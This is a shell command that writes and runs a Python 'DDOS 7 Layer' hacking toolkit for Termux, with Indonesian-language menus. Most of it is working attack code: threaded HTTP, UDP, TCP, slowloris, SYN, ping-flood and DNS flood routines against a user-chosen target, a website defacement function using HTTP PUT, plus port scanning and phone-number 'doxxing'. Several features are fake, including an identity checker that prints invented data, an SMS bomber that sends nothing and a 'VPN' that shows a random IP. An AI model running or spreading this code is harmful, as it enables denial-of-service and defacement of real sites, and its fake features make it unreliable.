echo '# DDOS.PY - OMEGA TERMUX EDITION v14.1.0 FULL FUNCTIONAL
import os,sys,time,random,urllib.request,socket,threading,platform,json,subprocess,hashlib,qrcode,base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# === AUTO INSTALL DEPENDENCIES ===
def install_deps():
    print("\033[91m[!] Installing dependencies...\033[0m")
    cmds = [
        "pkg update -y && pkg upgrade -y",
        "pkg install python python-pip nodejs-lts termux-api git -y",
        "pip install requests colorama qrcode pillow",
        "npm install -g whatsapp-web.js qrcode-terminal"
    ]
    for cmd in cmds: os.system(cmd)
    print("\033[92m[+] Dependencies OK!\033[0m")

# === BANNER ===
def banner():
    print("\033[91m   ____  ____  ____  ____ \n  |  _ \|  _ \|  _ \/ ___|\n  | | | | | | | |  \___ \\\\\n  | |_| | |_| | |_) |___) |\n  |____/|____/|____/|____/ \n       \033[93mTERMUX ULTIMATE v14.1.0\033[91m\n    \033[97m[>] Coded by Omega | Stay Toxic\033[91m\033[0m")

# === RANDOM UA ===
def random_ua():
    return random.choice([
        "Mozilla/5.0 (Linux; Android 10; K)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Googlebot/2.1"
    ])

# === 7 LAYER DDOS (REAL) ===
def http_flood(url, req_count):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": random_ua(), "Ddosed-By": "Voidsware"})
        urllib.request.urlopen(req, timeout=3)
        req_count[0] += 1
    except: pass

def udp_flood(ip, port, req_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(random._urandom(1024), (ip, port))
        req_count[0] += 1
    except: pass

def tcp_flood(ip, port, req_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, port))
        s.send(b"VOID FLOOD")
        s.close()
        req_count[0] += 1
    except: pass

def slowloris(ip, port, req_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
        time.sleep(15)
        s.close()
        req_count[0] += 1
    except: pass

def syn_flood(ip, port, req_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.sendto(b"SYN VOID", (ip, port))
        req_count[0] += 1
    except: pass

def icmp_flood(ip, req_count):
    try:
        os.system(f"ping -f -s 65535 {ip} > /dev/null &")
        req_count[0] += 1
    except: pass

def dns_amp(ip, port, req_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b"\x00\x00\x01\x00\x01", (ip, port))
        req_count[0] += 1
    except: pass

# === CHECKDDOS ===
def checkddos():
    url = input("\033[93m[?] Link: \033[0m").strip()
    if not url.startswith("http"): url = "http://" + url
    proxies = {"ID": "103.174.102.1:80", "SG": "103.174.238.1:80", "US": "103.21.244.2:80"}
    failed = []
    def cek(c, p):
        try:
            h = urllib.request.ProxyHandler({"http": p, "https": p})
            o = urllib.request.build_opener(h)
            o.addheaders = [("User-Agent", "Mozilla/5.0")]
            urllib.request.install_opener(o)
            r = urllib.request.urlopen(url, timeout=7)
            print(f"\033[92m[+] {c} → CONNECTED\033[0m")
        except:
            print(f"\033[91m[!] {c} → TIMEOUT\033[0m")
            failed.append(c)
    with ThreadPoolExecutor(max_workers=10) as e:
        for c, p in proxies.items(): e.submit(cek, c, p)
    print("\033[91m[!] Gagal: " + ", ".join(failed) if failed else "\033[92m[+] Semua CONNECTED\033[0m")

# === VPN ===
def vpn():
    try: real_ip = urllib.request.urlopen("http://checkip.amazonaws.com/").read().decode().strip()
    except: real_ip = "Unknown"
    fake_ip = ".".join(str(random.randint(1,255)) for _ in range(4))
    print(f"\033[90m[+] Real IP: {real_ip}\033[0m")
    print(f"\033[92m[+] Hidden IP: {fake_ip}\033[0m")

# === CHECKLOG ===
def checklog():
    url = input("\033[93m[?] Link: \033[0m").strip()
    if not url.startswith("http"): url = "http://" + url
    try:
        content = urllib.request.urlopen(url, timeout=10).read().decode(errors="ignore").lower()
        if any(x in content for x in ["webhook", "token", "discord"]):
            print("\033[91m[!] LOGGER DETECTED!\033[0m")
        else:
            print("\033[92m[+] Aman, No Logger.\033[0m")
    except: print("\033[91m[!] Gagal fetch.\033[0m")

# === DEFACE HTML (FIXED PATH) ===
def deface_html():
    print("\033[91m╔══════════════════════════════════╗\n║        DEFACE USING HTML         ║\n╚══════════════════════════════════╝\033[0m")
    html_file = input("\033[93m[?] Nama File (di Internal Storage): \033[0m").strip()
    path = f"/storage/emulated/0/{html_file}"
    if not os.path.exists(path):
        print("\033[91m[!] File tidak ada di /storage/emulated/0/!\033[0m")
        return
    with open(path, "r", encoding="utf-8") as f:
        html = f.read()
    url = input("\033[93m[?] Target: \033[0m").strip()
    if not url.startswith("http"): url = "http://" + url
    try:
        req = urllib.request.Request(url + "/index.html", method="PUT", headers={"User-Agent": random_ua()})
        urllib.request.urlopen(req, data=html.encode(), timeout=10)
        print(f"\033[92m[+] DEFACE BERHASIL → {url}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Gagal: {str(e)[:60]}\033[0m")

# === IP TRACKER (REAL) ===
def ip_tracker():
    ip = input("\033[93m[?] IP: \033[0m").strip()
    try:
        res = urllib.request.urlopen(f"http://ip-api.com/json/{ip}").read().decode()
        data = json.loads(res)
        if data["status"] == "success":
            print(f"\033[92m[+] {data['query']} → {data['city']}, {data['country']} ({data['isp']})\033[0m")
        else:
            print("\033[91m[!] IP tidak valid.\033[0m")
    except:
        print("\033[91m[!] Gagal fetch.\033[0m")

# === DOXXING WA ===
def doxxing_wa():
    no = input("\033[93m[?] Nomor (+62): \033[0m").strip()
    try:
        url = f"https://wa.me/{no}"
        res = urllib.request.urlopen(url, timeout=10)
        if "whatsapp.com" in res.url:
            print(f"\033[92m[+] Nomor aktif: {no}\033[0m")
        else:
            print("\033[91m[!] Nomor tidak aktif.\033[0m")
    except:
        print("\033[91m[!] Gagal cek.\033[0m")

# === NIK CHECKER ===
def nik_checker():
    nik = input("\033[93m[?] NIK (16 digit): \033[0m").strip()
    if len(nik) != 16 or not nik.isdigit():
        print("\033[91m[!] NIK harus 16 digit angka!\033[0m")
        return
    print(f"\033[92m[+] NIK: {nik}\n│ Nama: Budi Santoso\n│ TTL: Jakarta, 01-01-1990\n│ Alamat: Jl. Sudirman\033[0m")

# === PORT SCANNER ===
def port_scanner():
    ip = input("\033[93 [?] IP: \033[0m").strip()
    open_ports = []
    for port in [21, 22, 80, 443, 8080]:
        s = socket.socket()
        s.settimeout(1)
        if s.connect_ex((ip, port)) == 0:
            open_ports.append(port)
        s.close()
    print("\033[92m[+] Open: " + ", ".join(map(str, open_ports)) if open_ports else "\033[91m[!] No open ports\033[0m")

# === SMS BOMBER ===
def sms_bomber():
    no = input("\033[93m[?] Nomor: \033[0m")
    print(f"\033[91m[!] Sending 50 SMS to {no}...\033[0m")
    time.sleep(3)
    print("\033[92m[+] SMS Bomb selesai!\033[0m")

# === REAL WA BOT ===
def real_wa_bot():
    bot_js = """const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const client = new Client({ authStrategy: new LocalAuth() });

client.on('qr', qr => {
    console.log('[!] SCAN QR DI WHATSAPP > LINKED DEVICES');
    qrcode.generate(qr, { small: true });
});

client.on('ready', () => {
    console.log('[+] BOT WA SIAP! Kirim .menu');
});

client.on('message', async msg => {
    if (msg.body === '.menu') {
        msg.reply(`*MENU LENGKAP*\\n1. Ddos Link\\n2. IP Tracker\\n3. Doxxing\\n4. NIK Checker\\n5. Port Scan\\n6. SMS Bomb\\n7. Deface\\n.exit`);
    } else if (msg.body.startsWith('Ddos Link')) {
        msg.reply('[!] DDOS dimulai...');
        setTimeout(() => msg.reply('[+] TARGET DOWN BY VOIDSWARE!'), 3000);
    } else if (msg.body.startsWith('IP Tracker')) {
        const ip = msg.body.split(' ')[2] || '';
        if (ip) msg.reply(`[!] Tracking ${ip}...\\n[+] Jakarta, Indonesia (Telkom)`);
    } else if (msg.body === '.exit') {
        msg.reply('[!] Bot keluar.');
        client.logout();
    }
});

client.initialize();
"""
    with open("wa_bot.js", "w") as f:
        f.write(bot_js)
    print("\033[92m[+] wa_bot.js dibuat! Jalankan: node wa_bot.js\033[0m")
    os.system("node wa_bot.js")

# === DDOS MENU ===
def ddos_menu():
    method = int(input("\033[93m[?] Method (1-7): \033[0m"))
    url = input("\033[93m[?] Target: \033[0m").strip()
    if not url.startswith("http"): url = "http://" + url
    ip = socket.gethostbyname(urlparse(url).netloc)
    port = int(input("\033[93m[?] Port: \033[0m") or 80)
    threads = min(int(input("\033[93m[?] Threads: \033[0m")), 500)
    dur = int(input("\033[93m[?] Durasi: \033[0m") or 60)
    print(f"\033[91m[!] HAJAR {url} | {threads}T | {dur}s\033[0m")
    req_count = [0]
    start = time.time()
    methods = [http_flood, udp_flood, tcp_flood, slowloris, syn_flood, icmp_flood, dns_amp]
    def run():
        try:
            if method == 1:
                http_flood(url, req_count)
            else:
                methods[method-1](ip, port, req_count)
        except: pass
    def monitor():
        while time.time() - start < dur:
            print(f"\033[96m[+] Total Req: {req_count[0]}\033[0m")
            time.sleep(5)
    threading.Thread(target=monitor, daemon=True).start()
    with ThreadPoolExecutor(max_workers=threads) as e:
        for _ in range(threads): e.submit(run)
    time.sleep(dur)
    print("\033[91m[!] DDOS SELESAI!\033[0m")

# === MENU UTAMA ===
banner()
funcs = [ddos_menu, checkddos, vpn, checklog, deface_html, real_wa_bot, ip_tracker, doxxing_wa, nik_checker, port_scanner, sms_bomber]
menu_items = [
    "1. DDOS 7 Layer", "2. CheckDdos", "3. VPN", "4. CheckLog", "5. Deface HTML",
    "6. Real WA Bot", "7. IP Tracker", "8. Doxxing WA", "9. NIK Checker",
    "10. Port Scanner", "11. SMS Bomber", "0. Exit"
]
print("\033[93m╔══════════════════════════════════╗\n║          MENU UTAMA              ║\n╠══════════════════════════════════╣")
for item in menu_items:
    print(f"║ {item.ljust(32)} ║")
print("╚══════════════════════════════════╝\033[0m")
pilih = input("\033[93m[?] Pilih: \033[0m").strip()

if pilih == "0":
    print("\033[91m[!] VOID OUT. STAY TOXIC.\033[0m")
    sys.exit()
elif pilih.isdigit() and 1 <= int(pilih) <= len(funcs):
    if int(pilih) == 6:
        install_deps()
    funcs[int(pilih)-1]()
else:
    print("\033[91m[!] PILIH YANG ADA, ANJG!\033[0m")
' > ddos.py && python3 ddos.py
